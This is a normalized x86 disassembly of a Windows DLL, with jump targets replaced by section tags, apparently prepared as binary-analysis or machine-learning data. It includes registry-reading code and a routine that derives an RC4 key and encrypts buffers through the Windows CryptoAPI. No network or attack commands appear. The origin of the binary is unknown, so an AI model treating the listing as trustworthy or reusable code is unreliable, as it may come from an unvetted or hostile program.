add eax 0x2
cmp di si
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x84 ]
call sub_10034100
movzx ecx [ ebp - 0x21c ]
push ecx
lea edx [ ebp - 0x180 ]
push edx
mov [ ebp - 0x4 ] 0x5
call sub_10057f20
push eax
lea edx [ ebp - 0x30 ]
lea esi [ ebp - 0x1f0 ]
mov [ ebp - 0x4 ] 0x6
call sub_10040e00
add esp 0xc
push eax
mov edx r--data
lea esi [ ebp - 0x20c ]
mov [ ebp - 0x4 ] 0x7
call sub_100519f0
add esp 0x4
mov ecx eax
mov ebx 0x8
lea eax [ ebp - 0x84 ]
lea edi [ ebp - 0x1d4 ]
mov [ ebp - 0x4 ] bl
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x19c ]
mov [ ebp - 0x4 ] 0x9
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x4c ]
lea edi [ ebp - 0x148 ]
mov [ ebp - 0x4 ] 0xa
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x110 ]
mov [ ebp - 0x4 ] 0xb
call sub_100519f0
add esp 0x4
mov ecx eax
mov eax [ ebp - 0x214 ]
lea edi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0xc
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xd
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x68 ]
lea edi [ ebp - 0x1b8 ]
mov [ ebp - 0x4 ] 0xe
call sub_1006b070
push eax
mov edx r--data
lea esi [ ebp - 0x164 ]
mov [ ebp - 0x4 ] 0xf
call sub_100519f0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0xa0 ]
lea edi [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x10
call sub_1006b070
mov edx eax
mov ecx 0xc8
mov [ ebp - 0x4 ] 0x11
call sub_10022b50
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
xor edi edi
xor ecx ecx
mov esi 0x7
mov [ ebp - 0xa8 ] esi
mov [ ebp - 0xac ] edi
mov [ ebp - 0xbc ] cx
cmp [ ebp - 0x150 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x150 ] esi
mov [ ebp - 0x154 ] edi
mov [ ebp - 0x164 ] ax
cmp [ ebp - 0x1a4 ] ebx
jb r-xdata
mov edx [ ebp - 0x164 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x1a4 ] esi
mov [ ebp - 0x1a8 ] edi
mov [ ebp - 0x1b8 ] dx
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0x1b8 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0xc4 ] esi
mov [ ebp - 0xc8 ] edi
mov [ ebp - 0xd8 ] cx
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0xe0 ] esi
mov [ ebp - 0xe4 ] edi
mov [ ebp - 0xf4 ] ax
cmp [ ebp - 0xfc ] ebx
jb r-xdata
mov edx [ ebp - 0xf4 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0xfc ] esi
mov [ ebp - 0x100 ] edi
mov [ ebp - 0x110 ] dx
cmp [ ebp - 0x134 ] ebx
jb r-xdata
mov ecx [ ebp - 0x110 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x134 ] esi
mov [ ebp - 0x138 ] edi
mov [ ebp - 0x148 ] cx
cmp [ ebp - 0x188 ] ebx
jb r-xdata
mov eax [ ebp - 0x148 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x188 ] esi
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x19c ] ax
cmp [ ebp - 0x1c0 ] ebx
jb r-xdata
mov edx [ ebp - 0x19c ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d4 ] dx
cmp [ ebp - 0x1f8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x1d4 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1f8 ] esi
mov [ ebp - 0x1fc ] edi
mov [ ebp - 0x20c ] cx
cmp [ ebp - 0x1dc ] ebx
jb r-xdata
mov eax [ ebp - 0x20c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x1dc ] esi
mov [ ebp - 0x1e0 ] edi
mov [ ebp - 0x1f0 ] ax
cmp [ ebp - 0x16c ] ebx
jb r-xdata
mov edx [ ebp - 0x1f0 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x16c ] esi
mov [ ebp - 0x170 ] edi
mov [ ebp - 0x180 ] dx
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov ecx [ ebp - 0x180 ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x84 ] cx
cmp [ ebp - 0x38 ] ebx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
cmp [ ebp - 0x118 ] ebx
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ ebp - 0x118 ] esi
mov [ ebp - 0x11c ] edi
mov [ ebp - 0x12c ] dx
cmp [ ebp - 0x54 ] ebx
jb r-xdata
mov ecx [ ebp - 0x12c ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x68 ] cx
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_1000a86e
add esp 0x4
mov eax 0x1
mov edx [ ebp - 0xa0 ]
push edx
call sub_1000a86e
add esp 0x4
sub_1003cdad
push ebp
mov ebp esp
sub esp 0x1c
push ebx
xor ebx ebx
push ebx
push 0x1
push r--data
push ebx
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] 0x3e8
mov [ ebp - 0x18 ] ebx
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x10 ] ebx
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x80090016
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push 0x8003
push [ ebp - 0xc ]
call [ CryptCreateHash@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x800001
push 0x6801
push [ ebp - 0xc ]
call [ CryptGenKey@IAT ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0xc ]
push eax
call sub_10020fb2
jmp r-xdata
pop edi
pop esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x14 ]
call [ CryptHashData@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push ebx
push 0x8
push ebx
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp eax ebx
jne r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
push [ ebp - 0x14 ]
call [ CryptDestroyHash@IAT ]
mov [ ebp - 0x14 ] ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x800000
push [ ebp - 0x14 ]
push 0x6801
push [ ebp - 0xc ]
call [ CryptDeriveKey@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x4 ]
mov ebx [ GetProcessHeap@IAT ]
push 0x8
call ebx
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0x10 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0x8 ]
call [ CryptDestroyKey@IAT ]
push 0x3e8
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp + 0xc ] eax
cmp eax ebx
je r-xdata
xor ebx ebx
lea ecx [ ebp - 0x4 ]
push ecx
push eax
push 0x0
push 0x8
push 0x0
push [ ebp - 0x8 ]
call [ CryptExportKey@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
leave
retn 0x10
push ebx
push [ ebp - 0xc ]
call [ CryptReleaseContext@IAT ]
mov [ ebp + 0x13 ] 0x0
mov [ ebp + 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
mov eax [ edi ]
add eax 0x4
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
mov eax [ esi ]
add eax [ ebp + 0x8 ]
push [ ebp - 0x10 ]
add eax [ ebp - 0x18 ]
mov ebx [ ebp + 0xc ]
push eax
call sub_1004edb0
mov eax [ ebp - 0x10 ]
pop ecx
pop ecx
push eax
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
push eax
movzx eax [ ebp + 0x13 ]
push ebx
push 0x0
push eax
push 0x0
push [ ebp - 0x8 ]
call [ CryptEncrypt@IAT ]
test eax eax
je r-xdata
mov [ ebp + 0x13 ] 0x1
mov [ ebp - 0x10 ] eax
add [ edi ] 0x4
mov eax [ edi ]
add eax [ ebp - 0x4 ]
push eax
push [ esi ]
push 0x8
call ebx
push eax
call [ HeapReAlloc@IAT ]
mov [ esi ] eax
test eax eax
je r-xdata
push [ ebp + 0xc ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push [ ebp - 0x1c ]
push ebx
mov ebx [ esi ]
add ebx [ ebp + 0x8 ]
add ebx [ ebp - 0x18 ]
call sub_1004edb0
push [ ebp - 0x10 ]
mov ebx [ ebp + 0xc ]
call sub_1001e790
add esp 0xc
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
add [ edi ] ecx
mov eax [ edi ]
mov edx [ esi ]
sub eax ecx
sub eax 0x4
push eax
push edx
lea ebx [ edx + ecx + 0x4 ]
call sub_1004edb0
mov eax [ ebp - 0x4 ]
mov ebx [ esi ]
add eax 0x4
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x4 ]
push 0x4
push eax
call sub_1004edb0
push [ ebp - 0x4 ]
mov ebx [ esi ]
push [ ebp + 0x10 ]
add ebx 0x4
call sub_1004edb0
add esp 0x18
push [ ebp + 0x10 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
inc [ ebp + 0x14 ]
add [ ebp + 0x8 ] 0x3e8
jmp r-xdata
mov ecx [ ebp + 0x14 ]
imul ecx [ ebp - 0x10 ]
mov eax [ edi ]
sub eax ecx
sub eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
sub_1003d090
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
sub eax esi
sar eax 0x2
cmp eax 0x28
jle r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
inc eax
cdq
and edx 0x7
add eax edx
mov edx [ esi ]
sar eax 0x3
lea ecx [ eax * 8 ]
lea ebx [ eax * 4 ]
mov eax [ ebx + esi ]
push edx
push eax
mov [ ebp - 0xc ] ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov eax [ edi ]
mov ecx [ ebx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
mov edx [ ebx + esi ]
mov eax [ ebp - 0xc ]
mov ecx [ eax + esi ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] ecx
mov [ esi ] eax
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov eax [ esi ]
mov ecx [ ebx + esi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebx + esi ]
mov eax [ ecx + esi ]
mov [ ecx + esi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ esi ] eax
mov ecx [ edi ]
mov eax edi
sub eax ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ ebx + esi ]
mov [ ebx + esi ] edx
mov [ esi ] eax
mov eax [ edi ]
mov ecx [ ebx + edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov edx [ edi ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebx + edi ]
mov [ ebx + edi ] edx
mov [ edi ] eax
mov eax [ ebp + 0x8 ]
mov ecx eax
sub eax [ ebp - 0xc ]
sub ecx ebx
mov [ ebp - 0x8 ] eax
mov eax [ eax ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
mov eax [ ebp - 0x4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ecx ] eax
mov eax [ eax ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push eax
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx [ eax ]
mov [ eax ] edx
mov edx [ ebp - 0x8 ]
mov [ edx ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov edx [ ebx + esi ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov eax [ ecx ]
mov edx [ edx ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
mov edx [ ebp - 0x8 ]
mov ecx [ edx ]
mov edx [ eax ]
push ecx
push edx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] ecx
mov [ ebx + esi ] eax
mov eax [ ebx + esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0xc ]
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ edi ]
mov eax [ ecx ]
mov [ ecx ] edx
mov [ edi ] eax
mov edx [ ebx + esi ]
mov eax [ edi ]
mov [ edi ] edx
mov [ ebx + esi ] eax
pop ebx
mov esp ebp
pop ebp
retn
sub_1003d2b0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax edx
push esi
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
push r--data
call sub_1006a5c0
add esp 0xc
pop esi
pop ebp
retn
sub_1003d2e0
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
push esi
call [ LocalFree@IAT ]
sub_1003d310
push ebp
mov ebp esp
push 0xffffffff
push sub_100869a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x5c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov esi ecx
mov edi [ esi ]
lea ecx [ ebp - 0x54 ]
push ecx
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x54 ] 0x0
call sub_10007d60
mov [ ebp - 0x64 ] eax
test eax eax
je r-xdata
mov ebx [ ebp - 0x54 ]
push 0x4
push 0x0
mov [ ebp - 0x58 ] ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x62
call sub_1002f620
mov edi [ ebp - 0x54 ]
test edi edi
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x64 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x8
mov eax edi
call sub_10054bf0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov esi [ ebp - 0x5c ]
mov edi [ HeapFree@IAT ]
test ebx ebx
je r-xdata
inc [ esi ]
mov [ ebp - 0x54 ] esi
mov edi [ ebp - 0x60 ]
lea edx [ ebp - 0x58 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_10016630
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov eax ebx
call sub_10054bf0
push ebx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
sub_1003d460
push ebp
mov ebp esp
push ecx
cmp [ edi ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
push ebx
mov ebx [ LocalFree@IAT ]
push esi
mov edx [ edi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ edi ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ edi ]
mov esi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
pop esi
pop ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ esi + 0x20 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi + 0x20 ] 0x0
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
push eax
call ebx
sub_1003d4e1
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1003d56b
push 0xc
push r--data
call sub_1007fad0
call sub_10019512
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1007efa1
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003d5a1
mov eax [ ebp - 0x1c ]
call sub_1007fb15
retn
sub_1003d600
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax ebx
jae r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
ja r-xdata
push r--data
call sub_100651be
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
push r--data
call sub_10030594
cmp edx 0x10
jb r-xdata
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
lea edi [ eax + ecx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10030594
cmp edx 0x10
jb r-xdata
mov edi [ esi + 0x10 ]
add edi ecx
cmp edi eax
jbe r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_10045c60
test edi edi
je r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
mov edx [ ebp + 0x10 ]
push edx
sub eax ecx
push eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov ecx esi
call sub_10067560
pop edi
pop esi
pop ebp
retn 0xc
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
pop ebx
mov eax esi
pop edi
mov [ eax ] 0x0
pop esi
pop ebp
retn 0xc
mov eax [ esi ]
pop ebx
mov [ eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx ebx
push edx
add eax ebx
add eax [ ebp + 0x10 ]
add ecx ebx
push ecx
push eax
call sub_1007ec40
add esp 0xc
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
pop ebx
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0xc
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
push edx
add eax ebx
push eax
call sub_1007f580
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_1003d74d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_1004b131
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_1001002a
call sub_10013a49
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x22
sub_1003d800
push ebp
mov ebp esp
push 0xffffffff
push sub_10087edb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x324
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
push eax
xor ebx ebx
push ecx
lea edx [ ebp - 0x324 ]
mov [ ebp - 0x32c ] ebx
push edx
mov [ ebp - 0x324 ] ebx
call sub_100295c0
add esp 0xc
test eax eax
jne r-xdata
lea edx [ ebp - 0x84 ]
mov eax 0xe7
call sub_10069020
lea edx [ ebp - 0xfc ]
mov eax 0x32
call sub_10069020
lea edx [ ebp - 0x328 ]
push edx
push 0x1
push ebx
lea eax [ ebp - 0xfc ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x324 ]
mov [ ebp - 0x320 ] ax
mov eax edx
mov [ ebp - 0x30c ] 0x7
mov [ ebp - 0x310 ] ebx
lea edi [ eax + 0x2 ]
lea esp [ esp ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x304 ]
[ edi ]
lea edx [ ebp - 0x2c ]
mov eax 0xfc
mov [ ebp - 0x32c ] 0x206
call sub_10069020
lea eax [ ebp - 0x32c ]
push eax
mov eax [ ebp - 0x328 ]
lea ecx [ ebp - 0x304 ]
push ecx
push ebx
push ebx
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x84 ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
lea edx [ eax + 0x2 ]
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x320 ]
call sub_10034100
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x324 ]
push ecx
call [ SysFreeString@IAT ]
lea eax [ ebp - 0x320 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_10033f90
cmp [ ebp - 0x30c ] 0x8
jb r-xdata
mov eax [ ebp - 0x328 ]
push eax
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x304 ]
push ecx
mov ecx [ ebp - 0x328 ]
push ecx
call [ RegCloseKey@IAT ]
lea edx [ ebp - 0x84 ]
push edx
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x84 ]
push edx
mov ecx esi
call sub_10034100
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x320 ]
push ecx
call sub_1000a86e
add esp 0x4
jmp r-xdata
mov ecx esi
call sub_1004a920
sub_1003da10
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
mov eax [ ebp + 0x14 ]
push ebx
cdq
push esi
mov esi eax
add esi [ ebp + 0xc ]
push edi
mov edi [ ecx + 0x24 ]
mov eax [ edi ]
mov ebx edx
adc ebx [ ebp + 0x10 ]
test eax eax
je r-xdata
mov edx [ r--data ]
cmp esi edx
jne r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x24 ] 0x1
je r-xdata
cmp ebx [ r--data ]
je r-xdata
mov [ ecx + 0x3c ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov ebx [ r--data ]
mov esi edx
mov edi [ edi ]
mov [ esp + 0xc ] edi
test edi edi
je r-xdata
test ebx ebx
jl r-xdata
test ebx ebx
jl r-xdata
jg r-xdata
jg r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ ecx + 0x10 ]
mov edi [ edx ]
mov eax [ ecx + 0x3c ]
sub eax edi
cdq
cmp ebx edx
jg r-xdata
test esi esi
jb r-xdata
mov edx [ r--data ]
